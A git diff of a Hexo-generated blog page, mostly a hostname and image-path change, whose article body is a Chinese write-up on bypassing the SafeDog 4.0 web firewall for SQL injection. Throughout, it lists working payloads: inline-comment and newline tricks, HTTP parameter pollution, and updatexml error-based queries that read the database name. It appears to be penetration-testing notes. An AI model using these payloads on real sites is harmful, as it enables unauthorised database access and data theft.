@@ -17,7 +17,7 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
 <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
@@ -38,45 +38,45 @@
 
   <meta property="og:type" content="article">
 <meta property="og:title" content="安全狗4.0 sqli绕过">
-<meta property="og:url" content="http://example.com/posts/d405928/index.html">
+<meta property="og:url" content="http://mamor5409.github.io/posts/d405928/index.html">
 <meta property="og:site_name" content="Mamor&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//2.png">
-<meta property="og:image" content="http://example.com/.com//3.png">
-<meta property="og:image" content="http://example.com/.com//4.png">
-<meta property="og:image" content="http://example.com/.com//8.png">
-<meta property="og:image" content="http://example.com/.com//6.png">
-<meta property="og:image" content="http://example.com/.com//7.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http1.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http2.png">
-<meta property="og:image" content="http://example.com/.com//5.png">
-<meta property="og:image" content="http://example.com/.com//9.png">
-<meta property="og:image" content="http://example.com/.com//10.png">
-<meta property="og:image" content="http://example.com/.com//11.png">
-<meta property="og:image" content="http://example.com/.com//12.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http3.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http4.png">
-<meta property="og:image" content="http://example.com/.com//13.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http5.png">
-<meta property="og:image" content="http://example.com/.com//baocuo1.pmg">
-<meta property="og:image" content="http://example.com/.com//baocuo2.png">
-<meta property="og:image" content="http://example.com/.com//baocuo3.png">
-<meta property="og:image" content="http://example.com/.com//baocuo4.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http6.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http7.png">
-<meta property="og:image" content="http://example.com/posts/d405928/http_sleep.png">
-<meta property="og:image" content="http://example.com/.com//bool1.png">
-<meta property="og:image" content="http://example.com/.com//bool2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/6.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/7.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/9.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/10.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/11.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/12.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/13.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo1.pmg">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/baocuo4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http6.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http7.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/http_sleep.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/bool1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/d405928/bool2.png">
 <meta property="article:published_time" content="2021-05-19T08:20:43.000Z">
 <meta property="article:modified_time" content="2021-05-21T05:55:26.320Z">
 <meta property="article:author" content="Mamor">
 <meta property="article:tag" content="SQLi">
 <meta property="article:tag" content="waf">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/d405928/1.png">
 
-<link rel="canonical" href="http://example.com/posts/d405928/">
+<link rel="canonical" href="http://mamor5409.github.io/posts/d405928/">
 
 
 <script id="page-configurations">
@@ -250,7 +250,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/posts/d405928/">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/d405928/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/kabi.jpg">
@@ -329,11 +329,11 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="/.com//1.png"></p>
-<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="/.com//2.png"></p>
-<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="/.com//3.png"><br>无法绕过</p>
-<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="/.com//4.png"></p>
-<p><img src="/.com//8.png"><br>可以绕过<br><br></p>
+        <h4 id="and-1-1-绕过"><a href="#and-1-1-绕过" class="headerlink" title="and 1=1 绕过"></a>and 1=1 绕过</h4><p><img src="/posts/d405928/1.png"></p>
+<p>正常使用 <code>?id=tom&#39; and 1=1 --+</code>会被拦截<br><img src="/posts/d405928/2.png"></p>
+<h5 id="使用-amp-amp-替换and"><a href="#使用-amp-amp-替换and" class="headerlink" title="使用&amp;&amp;替换and"></a>使用<code>&amp;&amp;</code>替换and</h5><p><img src="/posts/d405928/3.png"><br>无法绕过</p>
+<h5 id="使用内联注释-！11440"><a href="#使用内联注释-！11440" class="headerlink" title="使用内联注释/*！11440 */"></a>使用内联注释<code>/*！11440 */</code></h5><p><img src="/posts/d405928/4.png"></p>
+<p><img src="/posts/d405928/8.png"><br>可以绕过<br><br></p>
 <h5 id="继续使用and"><a href="#继续使用and" class="headerlink" title="继续使用and"></a>继续使用and</h5><p>and 0x1</p>
 <p>可以使用十六进制绕过</p>
 <br>
@@ -347,25 +347,25 @@
 <br>
 
 <h4 id="order-by绕过"><a href="#order-by绕过" class="headerlink" title="order by绕过"></a>order by绕过</h4><h5 id="使用换行符和注释绕过"><a href="#使用换行符和注释绕过" class="headerlink" title="使用换行符和注释绕过"></a>使用换行符和注释绕过</h5><p><code>?name=tom&#39;/**/order/*/%0A*/by/**/3%23</code></p>
-<p><img src="/.com//6.png"><br><img src="/.com//7.png"></p>
+<p><img src="/posts/d405928/6.png"><br><img src="/posts/d405928/7.png"></p>
 <h5 id="使用http参数污染"><a href="#使用http参数污染" class="headerlink" title="使用http参数污染"></a>使用http参数污染</h5><p><code>name=tom1&#39; /*&amp;name=tom&#39; order by 3%23*/</code><br><img src="http1.png"><br><img src="http2.png"></p>
 <br>
 
 <hr>
 <h4 id="union-select-绕过"><a href="#union-select-绕过" class="headerlink" title="union select 绕过"></a>union select 绕过</h4><h5 id="内联注入"><a href="#内联注入" class="headerlink" title="内联注入"></a>内联注入</h5><p>尝试使用<code>?id=tom&#39; union/*!11440select*/ 1,2,3 --+</code></p>
 <p>fuzz跑了下10000-99999都无法绕过</p>
-<p><img src="/.com//5.png"></p>
+<p><img src="/posts/d405928/5.png"></p>
 <br>
 
-<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="/.com//9.png"></p>
+<h5 id="换行符-注释"><a href="#换行符-注释" class="headerlink" title="换行符+注释"></a>换行符+注释</h5><p><img src="/posts/d405928/9.png"></p>
 <p>无法绕过</p>
 <br>
 
-<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="/.com//10.png"></p>
+<h5 id="内联注释-换行符"><a href="#内联注释-换行符" class="headerlink" title="内联注释+换行符"></a>内联注释+换行符</h5><p><img src="/posts/d405928/10.png"></p>
 <p><code>tom%27/**/union/*!§10440§asd*//*!%0a*/select/**/1,2,3%20--+</code></p>
 <p>fuzz一下，发现91625以后的都可以绕过</p>
-<p><img src="/.com//11.png"></p>
-<p><img src="/.com//12.png"></p>
+<p><img src="/posts/d405928/11.png"></p>
+<p><img src="/posts/d405928/12.png"></p>
 <h5 id="http参数污染"><a href="#http参数污染" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom1&#39; union select 1,2,3%23*/</code></p>
 <p><img src="http3.png"></p>
 <p><img src="http4.png"></p>
@@ -376,7 +376,7 @@
 <br>
 
 <p>这里也可以通过内联注释 中间数字没试 随便输入了几个</p>
-<p><img src="/.com//13.png"></p>
+<p><img src="/posts/d405928/13.png"></p>
 <br>
 
 <hr>
@@ -388,18 +388,18 @@
 <hr>
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="内联注释-fuzz"><a href="#内联注释-fuzz" class="headerlink" title="内联注释+fuzz"></a>内联注释+fuzz</h5><p>updatexml</p>
 <p>无waf情况下</p>
-<p><img src="/.com//baocuo1.pmg"></p>
+<p><img src="/posts/d405928/baocuo1.pmg"></p>
 <p>开启安全狗</p>
-<p><img src="/.com//baocuo2.png"></p>
+<p><img src="/posts/d405928/baocuo2.png"></p>
 <p>updataxml()会被拦截，中间加内联注释可以绕过</p>
 <p><code>and updatexml/*!99999*/(1,concat(0x7e,(select database/*!99999*/()),0x7e),1) --+</code></p>
-<p><img src="/.com//baocuo3.png"></p>
+<p><img src="/posts/d405928/baocuo3.png"></p>
 <p>但是</p>
 <p><code>and updatexml/*!99999*/(1,concat(0x7e,(select/*!99999aaa*/database/*!99999*/()),0x7e),1) --+</code>会被拦截</p>
 <p>测试了下 <code>select from ...</code> 后面加东西就会被拦截</p>
 <p>在from 后面添加 <code>%23%0a</code>可以绕过</p>
 <p><code>and updatexml/*!99999*/(1,concat(0x7e,(select name from%23%0A%20 test ),0x7e),1) --+</code></p>
-<p><img src="/.com//baocuo4.png"></p>
+<p><img src="/posts/d405928/baocuo4.png"></p>
 <br>
 
 <h5 id="http参数污染-1"><a href="#http参数污染-1" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><code>?name=tom1&#39; /*&amp;name=tom&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)%23*/</code></p>
@@ -409,8 +409,8 @@
 
 <hr>
 <h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="http参数污染-2"><a href="#http参数污染-2" class="headerlink" title="http参数污染"></a>http参数污染</h5><p><img src="http_sleep.png"></p>
-<p><img src="/.com//bool1.png"> </p>
-<p><img src="/.com//bool2.png"></p>
+<p><img src="/posts/d405928/bool1.png"> </p>
+<p><img src="/posts/d405928/bool2.png"></p>
 <br>
 
 <br>
@@ -804,7 +804,7 @@ if (windowWidth > 768) {
   </script>
 
 
-<a target="_blank" rel="noopener" href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+<a href="https://mamor5409.github.io/" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 
 
